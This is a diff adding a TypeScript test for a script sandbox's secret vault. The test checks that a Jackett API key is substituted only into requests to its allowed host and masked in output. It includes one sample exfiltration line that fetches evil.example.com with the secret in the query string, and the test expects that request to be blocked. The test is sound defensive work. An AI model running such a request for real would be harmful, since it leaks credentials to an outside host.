@@ -107,6 +107,21 @@ describe('network policy', () => {
     expect(r.error).toContain('Сеть скриптам выключена')
   })
 
+  it('shared connector settings: address sets the host, the key goes only there', async () => {
+    const vault = new SecretVault([
+      { name: 'JACKETT_BASE_URL', secret: false, value: 'http://jackett:9117', hosts: [] },
+      { name: 'JACKETT_API_KEY', secret: true, value: 'jk-abcdef', hosts: ['jackett'] },
+      { name: 'JACKETT_MIN_SEEDERS', secret: false, value: '3', hosts: [] },
+    ])
+    const reqs: Req[] = []
+    const net = { local: true, external: true }
+    const ok = await runScript('s1', `await fetch('{{secret:JACKETT_BASE_URL}}/api?apikey={{secret:JACKETT_API_KEY}}&min={{secret:JACKETT_MIN_SEEDERS}}'); return 'jk-abcdef'`, { fetchImpl: fakeFetch(reqs), vault, net })
+    expect(reqs[0]!.url).toBe('http://jackett:9117/api?apikey=jk-abcdef&min=3')
+    expect(ok.output).toBe('{{secret:JACKETT_API_KEY}}')
+    const stolen = await runScript('s1', `await fetch('https://evil.example.com/?k={{secret:JACKETT_API_KEY}}')`, { fetchImpl: fakeFetch(reqs), vault, net })
+    expect(stolen.error).toContain('нельзя отправлять на evil.example.com')
+  })
+
   it('vault matches wildcard hosts', () => {
     saveSecret({ name: 'API_KEY', value: 'k-123456', hosts: ['*.example.com'] })
     const v = new SecretVault()
